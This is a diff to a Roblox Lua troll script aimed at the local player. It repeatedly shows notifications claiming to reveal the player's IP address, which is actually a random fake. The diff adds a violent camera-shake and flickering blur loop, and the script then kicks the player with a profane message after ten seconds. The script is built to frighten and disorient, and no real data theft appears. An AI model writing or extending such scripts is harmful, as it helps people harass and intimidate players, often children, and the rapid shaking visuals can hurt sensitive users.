@@ -1,5 +1,18 @@
 local player = game.Players.LocalPlayer
+local camera = game.Workspace.CurrentCamera
 local chatService = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
+
+local blur = Instance.new("BlurEffect")
+blur.Parent = game.Lighting
+blur.Size = 0
+
+local notificationIcons = {
+    "rbxassetid://122057642212601",
+    "rbxassetid://123685354639032",
+    "rbxassetid://84316431860234",
+    "rbxassetid://18252123357",
+    "rbxassetid://136766362280868"
+}
 
 local function sendMessage(message)
     chatService:WaitForChild("SayMessageRequest"):FireServer(message, "All")
@@ -8,10 +21,10 @@ end
 local function sendNotification(title, text)
     pcall(function()
         game.StarterGui:SetCore("SendNotification", {
-            Title = title; 
-            Text = text; 
-            Icon = "rbxassetid://134810649457295";
-            Duration = 10;
+            Title = title, 
+            Text = text, 
+            Icon = notificationIcons[math.random(1, #notificationIcons)], 
+            Duration = 10
         })
     end)
 end
@@ -40,10 +53,22 @@ end
 
 local fakeIP = math.random(100, 255).."."..math.random(10, 200).."."..math.random(1, 255).."."..math.random(1, 255)
 
+local function extremeShake()
+    while true do
+        camera.CFrame = camera.CFrame * CFrame.new(
+            math.random(-5, 5),
+            math.random(-5, 5),
+            math.random(-5, 5)
+        )
+        blur.Size = math.random(20, 50)
+        wait(0.02)
+    end
+end
+
 task.spawn(function()
     while true do
         sendNotification("ur cooked", "Your IP: " .. fakeIP)
-        wait(0.1) -- Spams a notification every 0.1 seconds
+        wait(0.1)
     end
 end)
 
@@ -65,7 +90,9 @@ task.spawn(function()
     end
 end)
 
+task.spawn(extremeShake)
+
 task.spawn(function()
     wait(10)
-    player:Kick("FUCK U" .. fakeIP)
+    player:Kick("FuckU" .. fakeIP)
 end)
